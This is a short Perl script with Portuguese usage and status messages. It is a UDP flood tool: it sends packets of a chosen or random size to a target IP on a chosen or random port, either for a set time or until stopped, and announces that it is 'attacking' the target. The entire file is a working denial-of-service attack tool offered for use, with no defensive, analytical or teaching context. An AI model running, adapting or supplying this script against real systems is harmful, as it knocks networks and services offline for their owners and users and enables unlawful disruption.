#!/usr/bin/perl
use Socket;
use strict;

if ($#ARGV != 3) {
  print "UDP  \n";
  print "<ip> <port> <size> <time>\n\n";
  print "flood exemplo - perl bin ip 80 2048 0\n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "N�o � poss�vel resolver HOSTNAME $ip\n";
$endtime = time() + ($time ? $time : 1000000);

socket(flood, PF_INET, SOCK_DGRAM, 17);


print "Atacando $ip " . ($port ? $port : "aleatoria") . " porta " .
  ($size ? "$size-byte" : "tamanho aleatorio") . " Pacotes" .
  ($time ? " for $time segundos" : "") . "\n";
print "pare com CTRL+C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(2048-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,$iaddr));}